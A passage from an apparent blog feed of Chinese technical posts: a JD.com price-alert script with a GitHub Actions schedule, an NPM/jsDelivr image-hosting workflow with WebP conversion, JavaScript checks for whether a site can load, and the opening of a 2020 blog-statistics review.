class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" 